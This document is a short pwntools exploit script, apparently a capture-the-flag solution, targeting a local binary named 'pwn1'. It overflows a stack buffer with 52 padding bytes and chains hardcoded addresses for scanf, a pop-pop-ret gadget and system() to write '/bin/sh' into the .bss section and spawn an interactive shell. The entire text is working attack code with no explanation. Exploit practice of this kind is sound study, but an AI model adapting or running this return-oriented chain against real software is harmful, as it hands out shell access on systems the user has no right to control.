
from pwn import *

p = process('./pwn1')

ppr_addr = p32(0x080485ee)
bss_addr = p32(0x0804a040)
system_addr = p32(0x080483e0)
scanf_addr = p32(0x08048410)
format_addr = p32(0x08048629)

payload = b'\x90'*52 + scanf_addr + ppr_addr + format_addr + bss_addr + system_addr + b'\x90'*4 + bss_addr

p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
